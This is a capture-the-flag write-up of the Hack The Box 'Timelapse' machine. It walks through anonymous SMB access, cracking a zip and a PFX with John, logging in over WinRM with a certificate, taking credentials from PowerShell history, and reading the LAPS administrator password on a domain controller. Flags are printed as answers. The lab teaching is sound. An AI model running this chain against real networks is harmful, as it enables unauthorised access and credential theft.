---
title: 'Timelapse'
date: '2026-09-12'
excerpt: 'Easy - Windows (CJCA Preparation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Timelapse</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4"> </p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the common name on TLS/SSL certificate returned from one of the open TCP ports on Timelapse?</p>
<p class="mb-3"></p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.227.113 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-12 09:03 EDT
Nmap scan report for 10.129.227.113
Host is up (0.19s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-11 21:07:36Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-09-11T21:09:00+00:00; -15h56m07s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -15h56m07s, deviation: 0s, median: -15h56m07s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-11T21:08:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.89 seconds
```

<p class="mb-5"><strong>Answer:</strong> dc01.timelapse.htb</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What TCP port is SMB running on?</p>
<p class="mb-3">Since port 445 is open, we view the available SMB shares using the command <code>smbclient -L //[TARGET_IP]/</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ smbclient -L //10.129.227.113/
Password for [WORKGROUP\aaronamran]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

<p class="mb-5"><strong>Answer:</strong> 445</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a password-protected zip file to a format ?</p>
<p class="mb-3">The output of listing available SMB shares shows there is a name with the name <code>shares</code>, which we can access without any credentials.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ smbclient //10.129.227.113/Shares
Password for [WORKGROUP\aaronamran]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

		6367231 blocks of size 4096. 1336371 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

		6367231 blocks of size 4096. 1336371 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \Dev\> exit
```

<p class="mb-3">There are two folders named <code>Dev</code> and <code>HelpDesk</code>. In the <code>Dev</code> folder, we find a zip file named <code>winrm_backup.zip</code>. Trying to unzip the file requires a password which we currently do not have. We then attempt to crack the password with the hash cracking tool <code>John</code>, but first we need to convert the zip into a hash format with the <code>zip2john</code> tool.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ zip2john winrm_backup.zip > zip.john
Created directory: /home/aaronamran/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-09-12 09:50) 2.380g/s 8270Kp/s 8270Kc/s 8270KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<p class="mb-5"><strong>Answer:</strong> zip2john</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What tool from the John The Ripper tool suite can be used to generate a hash that can be used by John The Ripper from a pfx file?</p>
<p class="mb-3">We obtained the password <code>supremelegacy</code>, which we use to unzip <code>winrm_backup.zip</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  Music  my_data  Pictures  Templates  Videos  winrm_backup.zip  zip.john
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  legacyy_dev_auth.pfx  Music  my_data  Pictures  Templates  Videos  winrm_backup.zip  zip.john
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ file legacyy_dev_auth.pfx 
legacyy_dev_auth.pfx: data
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:
Mac verify error: invalid password?
```

<p class="mb-3">The output is a PFX file which contains an SSL certificate in <code>PKCS#12</code> format and a private key. PFX files can be used by WinRM in order to login without a password. We attempt to extract them from the file by running <code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes</code>, but we cannot use the same <code>supremelegacy</code> password. We then utilise the <code>pfx2john</code> utlity to convert the PFX file into a hash format, then use John to crack the password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  legacyy_dev_auth.pfx  Music  my_data  pfx.john  Pictures  Templates  Videos  winrm_backup.zip  zip.john
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:23 DONE (2026-09-12 10:07) 0.04196g/s 135616p/s 135616c/s 135616C/s thumper1990..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
Enter Import Password:
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ ls
cacert.der  Desktop    Downloads  legacyy_dev_auth.pfx  my_data   Pictures   Videos            zip.john
cert.pem    Documents  key.pem    Music                 pfx.john  Templates  winrm_backup.zip
```

<p class="mb-3">We obtained the password <code>thuglegacy</code>, which we use when required once we run <code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes</code> and <code>openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem</code> to extract the SSL certificate and private key from the PFX file.</p>
<p class="mb-5"><strong>Answer:</strong> pfx2john</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What is the default port for the Windows Remote Management or WinRM service over HTTP (not HTTPS)?</p>
<p class="mb-3">Our Nmap scan output shows us that port 5986 is open, which is commonly used by WinRM but using SSL instead of unencrypted connections. Since <code>Evil-WinRM</code> allows us to pass a key and certificate using the <code>-c</code> and <code>-k</code> flags, we can pass the certificate and key to authenticate to the target.</p>
<p class="mb-5"><strong>Answer:</strong> 5985</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Using Evil-WinRM, the -c flag will allow the user to provide a certificate. What flag can be used to provide a private key?</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ evil-winrm -h
                                        
Evil-WinRM shell v3.5

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```

<p class="mb-5"><strong>Answer:</strong> -k</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located on the legacyy user's desktop.</p>
<p class="mb-3">Due to having Ruby compatibility bug issue inside the <code>evil-winrm</code> SSL/Certificate validation functions, we do a quick dynamic patch while authenticating to the target.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ ruby -e 'class File; def self.exists?(f); exist?(f); end; end; load "/usr/bin/evil-winrm"' -- -i 10.129.227.113 -c cert.pem -k key.pem -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls -Recurse


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/11/2026   2:01 PM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
209e15a9fec4a7158cf1bc5da067005c
```

<p class="mb-5"><strong>Answer:</strong> 209e15a9fec4a7158cf1bc5da067005c</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What is the full path used to read PowerShell history file, starting from $env:?</p>
<p class="mb-3">We can read the commandline history by running <code>type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> to check for helpful clues or information. We saw it contains the username <code>svc_deploy</code> and password <code>E3R$Q62^12p7PLlC%KWaxuaV</code>.</p>

```console
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

<p class="mb-5"><strong>Answer:</strong> $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What user's password can be found in that PowerShell history file?</p>
<p class="mb-5"><strong>Answer:</strong> svc_deploy</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> What non-standard group is svc_deploy a part of?</p>
<p class="mb-3">Once we login as <code>svc_deploy</code> using the credentials discovered earlier, we run <code>net user svc_deploy</code> to check the groups that <code>svc_deploy</code> is a member of.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

<p class="mb-5"><strong>Answer:</strong> LAPS_Readers</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> What is the acronym LAPS short for?</p>
<p class="mb-3">Local Administrator Password Solution is a Microsoft tool that automatically manages, randomizes, and backs up the password of the local administrator account on domain-joined Windows computers. Instead of a system administrator manually setting or tracking these passwords, LAPS forces each computer to change its own local admin password on a regular schedule and securely store the encrypted password directly in Active Directory or Microsoft Entra ID. Only authorized IT administrators have the permissions to read these passwords when troubleshooting a machine.</p>
<p class="mb-5"><strong>Answer:</strong> Local Administrator Password Solution</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> What is the name of the property on an active directory computer object that contains the LAPS-generated password for the administrator account?</p>
<p class="mb-3"><code>ms-Mcs-AdmPwd</code> stores the managed local administrator password in clear text.</p>
<p class="mb-5"><strong>Answer:</strong> ms-Mcs-AdmPwd</p>
<br />


<p class="mb-2"><strong>Question 13:</strong> Submit the flag located on the TRX user's desktop.</p>
<p class="mb-3">Earlier, we discovered that <code>svc_deploy</code> was a part of the <code>LAPS_Readers</code> group. In GitHub, we download the PowerShell module to retrieve this password, and upload it to the target machine via Evil-WinRM.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ git clone https://github.com/ztrhgf/LAPS.git
Cloning into 'LAPS'...
remote: Enumerating objects: 66, done.
remote: Counting objects: 100% (29/29), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 66 (delta 16), reused 6 (delta 2), pack-reused 37 (from 1)
Receiving objects: 100% (66/66), 509.00 KiB | 26.79 MiB/s, done.
Resolving deltas: 100% (29/29), done.
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ cd LAPS && ls -al
total 56
drwxrwxr-x  5 aaronamran aaronamran  4096 Sep 12 10:52 .
drwx------ 24 aaronamran aaronamran  4096 Sep 12 10:52 ..
drwxrwxr-x  3 aaronamran aaronamran  4096 Sep 12 10:52 AdmPwd.PS
drwxrwxr-x  2 aaronamran aaronamran  4096 Sep 12 10:52 AutoItX
drwxrwxr-x  8 aaronamran aaronamran  4096 Sep 12 10:52 .git
-rw-rw-r--  1 aaronamran aaronamran 19979 Sep 12 10:52 Invoke-MSTSC.ps1
-rw-rw-r--  1 aaronamran aaronamran  2023 Sep 12 10:52 README.md
-rw-rw-r--  1 aaronamran aaronamran  3871 Sep 12 10:52 Send-LAPSPassword.ps1
-rw-rw-r--  1 aaronamran aaronamran  5435 Sep 12 10:52 Test-Connection2.ps1
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~/LAPS]
└──╼ [★]$ mv AdmPwd.PS ..
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~/LAPS]
└──╼ [★]$ ls
AutoItX  Invoke-MSTSC.ps1  README.md  Send-LAPSPassword.ps1  Test-Connection2.ps1
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~/LAPS]
└──╼ [★]$ cd && ls
AdmPwd.PS   cert.pem  Documents  key.pem  legacyy_dev_auth.pfx  my_data   Pictures   Videos            zip.john
cacert.der  Desktop   Downloads  LAPS     Music                 pfx.john  Templates  winrm_backup.zip
```

<p class="mb-3">After uploading the module, we need to import the module via the absolute path to the <code>.psd1</code> file. Then we run <code>Find-AdmPwdExtendedRights -identity *</code> to check what objects can manage the LAPS.</p>

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS
                                        
Info: Uploading /home/aaronamran/AdmPwd.PS to C:\Users\svc_deploy\Documents\AdmPwd.PS
                                        
Data: 53980 bytes of 53980 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Import-Module C:\Users\svc_deploy\Documents\AdmPwd.PS\AdmPwd.PS.psd1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity *

Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=timelapse,DC=htb                         Delegated
Servers              OU=Servers,DC=timelapse,DC=htb                                    Delegated
Database             OU=Database,OU=Servers,DC=timelapse,DC=htb                        Delegated
Web                  OU=Web,OU=Servers,DC=timelapse,DC=htb                             Delegated
Dev                  OU=Dev,OU=Servers,DC=timelapse,DC=htb                             Delegated
Staff                OU=Staff,DC=timelapse,DC=htb                                      Delegated
Admins               OU=Admins,OU=Staff,DC=timelapse,DC=htb                            Delegated
Dev                  OU=Dev,OU=Staff,DC=timelapse,DC=htb                               Delegated
HelpDesk             OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb                          Delegated
Groups               OU=Groups,OU=Staff,DC=timelapse,DC=htb                            Delegated
More than one object found, search using distinguishedName instead
```

<p class="mb-3">From the output, we can see Domain Controllers. We need to look at the right holders to see if we are able to manage the password by running <code>Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders</code>.</p>

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders

ExtendedRightHolders
--------------------
{NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}
```

<p class="mb-3">This output shows that the <code>LAPS_Readers</code> group has delegation over Domain Controllers which allows us to read the password for users in this object. We retrieve the password by using the command <code>get-admpwdpassword -computername dc01 | Select password</code>.</p>

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password

Password
--------
.@%30Auf#bt693tm4zRZHx97
```

<p class="mb-3">Using a new Evil-WinRM session, we authenticate to the target using the newly obtained credentials, and navigate to the flag located in the Desktop folder of the user named TRX.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-mmfxmioto1]─[~]
└──╼ [★]$ evil-winrm -i 10.129.227.113 -u administrator -p '.@%30Auf#bt693tm4zRZHx97' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\Users
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX


*Evil-WinRM* PS C:\Users> cd Trx\Desktop
*Evil-WinRM* PS C:\Users\Trx\Desktop> ls


    Directory: C:\Users\Trx\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/11/2026   2:01 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Trx\Desktop> cat root.txt
0b62d04e96f3bd3f5a48ddb4921dd97b
```

<p class="mb-5"><strong>Answer:</strong> 0b62d04e96f3bd3f5a48ddb4921dd97b</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>